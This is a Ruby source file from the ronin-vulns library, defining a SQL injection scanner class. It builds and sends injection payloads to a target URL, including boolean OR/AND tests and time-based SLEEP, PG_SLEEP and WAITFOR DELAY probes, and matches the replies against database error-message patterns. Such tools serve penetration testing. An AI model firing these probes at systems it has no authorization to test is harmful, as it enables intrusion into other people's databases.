# frozen_string_literal: true
#
# ronin-vulns - A Ruby library for blind vulnerability testing.
#
# Copyright (c) 2022-2023 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-vulns is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-vulns is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-vulns.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/vulns/web_vuln'
require 'ronin/vulns/sqli/error_pattern'

require 'time'

module Ronin
  module Vulns
    #
    # Represents a SQL injection vulnerability.
    #
    # ## Features
    #
    # * Supports testing ` OR 1=1` and ` AND 1=0`.
    # * Supports testing SQL sleep functions.
    #
    class SQLI < WebVuln

      # Specifies whether to escape a quoted string value.
      #
      # @return [Boolean]
      attr_reader :escape_quote

      # Specifies whether to escape parenthesis.
      #
      # @return [Boolean]
      attr_reader :escape_parens

      # Specifies whether to terminate the SQL statement with `--`.
      #
      # @return [Boolean]
      attr_reader :terminate

      #
      # Initializes the SQL injection vulnerability.
      #
      # @param [URI::HTTP, String] url
      #   The URL to test or exploit.
      #
      # @param [Boolean] escape_quote
      #   Specifies whether to escape a quoted string value.
      #
      # @param [Boolean] escape_parens
      #   Specifies whether to escape parenthesis.
      #
      # @param [Boolean] terminate
      #   Specifies whether to terminate the SQL statement with `--`.
      #
      def initialize(url, escape_quote:    false,
                          escape_parens:   false,
                          terminate:       false,
                          **kwargs)
        super(url,**kwargs)

        @escape_quote  = escape_quote
        @escape_parens = escape_parens
        @terminate     = terminate

        @escape_string = build_escape_string
      end

      private

      #
      # Builds the SQL escape String.
      #
      # @return [String]
      #
      def build_escape_string
        if @escape_quote && @escape_parens
          "#{original_value}')"
        elsif @escape_quote
          "#{original_value}'"
        elsif @escape_parens
          "#{original_value})"
        else
          original_value
        end
      end

      public

      #
      # Scans the URL for SQL injections.
      #
      # @param [URI::HTTP, String] url
      #   The URL to test or exploit.
      #
      # @param [Ronin::Support::Network::HTTP, nil] http
      #   An HTTP session to use for testing the URL.
      #
      # @param [Hash{Symbol => Object}] kwargs
      #   Additional keyword arguments for {WebVuln.scan}.
      #
      # @option kwargs [Boolean] :escape_quote
      #   Controls whether to escape a quoted string value. If not specified,
      #   with and without quoted string escaping will be tested.
      #
      # @option kwargs [Boolean] :escape_parens
      #   Controls whether to escape parenthesis. If not specified, with and
      #   without parenthesis escaping will be tested.
      #
      # @option kwargs [Boolean] :terminate
      #   Controls whether to terminate the SQL statement with `--`.
      #   If not specified, with and without `--` terminate will be tested.
      #
      # @yield [sqli]
      #   If a block is given it will be yielded each discovered SQL injection
      #   vulnerability.
      #
      # @yieldparam [SQLI] sqli
      #   A discovered SQL injection vulnerability in the URL.
      #
      # @return [Array<SQLI>]
      #   All discovered SQL injection vulnerabilities.
      #
      def self.scan(url, http: nil, **kwargs, &block)
        url    = URI(url)
        http ||= Support::Network::HTTP.connect_uri(url)

        enum_booleans = ->(key) {
          if kwargs.has_key?(key) then [kwargs.delete(key)]
          else                         [false, true]
          end
        }

        escape_quotes = enum_booleans.call(:escape_quote)
        escape_parens = enum_booleans.call(:escape_parens)
        terminations  = enum_booleans.call(:terminate)

        vulns = []

        escape_quotes.each do |escape_quote|
          escape_parens.each do |escape_paren|
            terminations.each do |terminate|
              vulns.concat(super(url, escape_quote:    escape_quote,
                                      escape_parens:   escape_paren,
                                      terminate:       terminate,
                                      http:            http,
                                      **kwargs,
                                      &block))
            end
          end
        end

        return vulns
      end

      #
      # Escapes the given SQL and turns it into a SQL injection.
      #
      # @param [#to_s] sql
      #   The SQL expression to escape.
      #
      # @return [String]
      #   The escaped SQL expression.
      #
      def escape(sql)
        sqli = if sql.start_with?(';')
                 "#{@escape_string}#{sql}"
               else
                 "#{@escape_string} #{sql}"
               end

        if @terminate
          sqli << '--'
        else
          sqli.chop! if (@escape_parens && sqli.end_with?(')'))
          sqli.chop! if (@escape_quote  && sqli.end_with?("'"))
        end

        return sqli
      end

      #
      # Encodes the SQL payload.
      #
      # @see #escape
      #
      def encode_payload(sql)
        escape(sql)
      end

      #
      # Tests whether the URL is vulnerable to SQL injection.
      #
      # @return [Boolean]
      #
      def vulnerable?
        test_or_true_and_false || test_sleep
      end

      # SQL error message patterns for various databases.
      ERROR_PATTERNS = {
        postgresql: ErrorPattern[
          /PostgreSQL.*ERROR/,
          /Warning.*\Wpg_/,
          /valid PostgreSQL result/,
          /Npgsql\./,
          /PG::SyntaxError:/,
          /org\.postgresql\.util\.PSQLException/,
          /ERROR:\s\ssyntax error at or near/,
          /ERROR: parser: parse error at or near/,
          /PostgreSQL query failed/,
          /org\.postgresql\.jdbc/,
          %r{Pdo[\./_\\]Pgsql},
          /PSQLException/
        ],

        mysql: ErrorPattern[
          /SQL syntax.*MySQL/,
          /Warning.*\Wmysqli?_/,
          /MySQLSyntaxErrorException/,
          /valid MySQL result/,
          /check the manual that corresponds to your (MySQL|MariaDB) server version/,
          /Unknown column '[^ ]+' in 'field list'/,
          /MySqlClient\./,
          /com\.mysql\.jdbc/,
          /Zend_Db_(?:Adapter|Statement)_Mysqli_Exception/,
          %r{Pdo[\./_\\]Mysql},
          /MySqlException/
        ],

        sqlite: ErrorPattern[
          %r{SQLite/JDBCDriver},
          /SQLite\.Exception/,
          /(Microsoft|System)\.Data\.SQLite\.SQLiteException/,
          /Warning.*\W(?:sqlite_|SQLite3::)/,
          /\[SQLITE_ERROR\]/,
          /SQLite error \d+:/,
          /sqlite3\.OperationalError:/,
          /SQLite3::SQLException/,
          /org\.sqlite\.JDBC/,
          %r{Pdo[\./_\\]Sqlite},
          /SQLiteException/
        ],

        mssql: ErrorPattern[
          /Driver.* SQL[\-\_\ ]*Server/,
          /OLE DB.* SQL Server/,
          /\bSQL Server[^<"]+Driver/,
          /Warning.*\W(?:mssql|sqlsrv)_/,
          /\bSQL Server[^<"]+[0-9a-fA-F]{8}/,
          /System\.Data\.SqlClient\.SqlException/,
          /Exception.*\bRoadhouse\.Cms\./m,
          /Microsoft SQL Native Client error '[0-9a-fA-F]{8}/,
          /\[SQL Server\]/,
          /ODBC SQL Server Driver/,
          /ODBC Driver \d+ for SQL Server/,
          /SQLServer JDBC Driver/,
          /com\.jnetdirect\.jsql/,
          /macromedia\.jdbc\.sqlserver/,
          /Zend_Db_(?:Adapter|Statement)_Sqlsrv_Exception/,
          /com\.microsoft\.sqlserver\.jdbc/,
          %r{Pdo[\./_\\](?:Mssql|SqlSrv)},
          /SQL(?:Srv|Server)Exception/
        ],

        oracle: ErrorPattern[
          /\bORA-\d{5}/,
          /Oracle error/,
          /Oracle.*Driver/,
          /Warning.*\W(?:oci|ora)_/,
          /quoted string not properly terminated/,
          /SQL command not properly ended/,
          /macromedia\.jdbc\.oracle/,
          /oracle\.jdbc/,
          /Zend_Db_(?:Adapter|Statement)_Oracle_Exception/,
          %r{Pdo[\./_\\](?:Oracle|OCI)},
          /OracleException/
        ]
      }

      #
      # Checks if the response contains a SQL error message.
      #
      # @param [Net::HTTPResponse] response
      #   The HTTP response object to check.
      #
      # @return [Boolean]
      #   Indicates whether the response was a `500` and if the response body
      #   contained a SQL error message.
      #
      def check_for_sql_errors(response)
        if response.code == '500'
          ERROR_PATTERNS.each do |database,error_pattern|
            if error_pattern =~ response.body
              return true
            end
          end
        end

        return false
      end

      #
      # Returns a random ID.
      #
      # @return [Integer]
      #   A four digit ID.
      #
      # @api private
      #
      def random_id
        rand(8_999..9999)
      end

      #
      # Tests whether the URL is vulnerable to SQL injection, using the
      # ` OR 1=1` vs. ` AND 1=0` technique.
      #
      # @return [Boolean]
      #
      # @api private
      #
      def test_or_true_and_false
        id = random_id

        response1 = exploit("OR #{id}=#{id}")
        response2 = exploit("AND #{random_id}=#{random_id}")

        # check for SQL errors in both responses
        if check_for_sql_errors(response1) || check_for_sql_errors(response2)
          return true
        end

        if response1.code =~ /^20[0-6]$/ && response2.code =~ /^20[0-6]$/
          # the first response contained more results than the second response
          return response1.body.length > response2.body.length
        elsif response1.code =~ /^20[0-6]$/ && response2.code =~ /^(?:404|500)$/
          # if the second response return an error, that indicates the
          # SQL expression evaluated to false and returned no results.
          return true
        end
      end

      # Various SQL sleep functions or statements.
      #
      # @api private
      SLEEP_TESTS = [
        'SLEEP(5)',
        "PG_SLEEP(5)",
        "WAITFOR DELAY '0:0:5'"
      ]

      #
      # Tests whether the URL is vulnerable to SQL injection, by calling SQL
      # sleep functions to see if it takes longer for the response to be
      # returned.
      #
      # @return [Boolean]
      #
      # @api private
      #
      def test_sleep
        SLEEP_TESTS.each do |sql|
          [sql, ";SELECT #{sql}"].each do |sqli|
            start_time = Time.now
            response   = exploit(sqli)
            stop_time  = Time.now
            delta      = (stop_time - start_time)

            # check for SQL errors first
            if check_for_sql_errors(response)
              return true
            end

            # if the response took more than 5 seconds, our SQL sleep function
            # probably worked.
            return true if delta > 5.0
          end
        end

        return false
      end

      #
      # Returns the type or kind of vulnerability.
      #
      # @return [Symbol]
      #
      # @note
      #   This is used internally to map an vulnerability class to a printable
      #   type.
      #
      # @api private
      #
      # @abstract
      #
      def self.vuln_type
        :sqli
      end

    end
  end
end
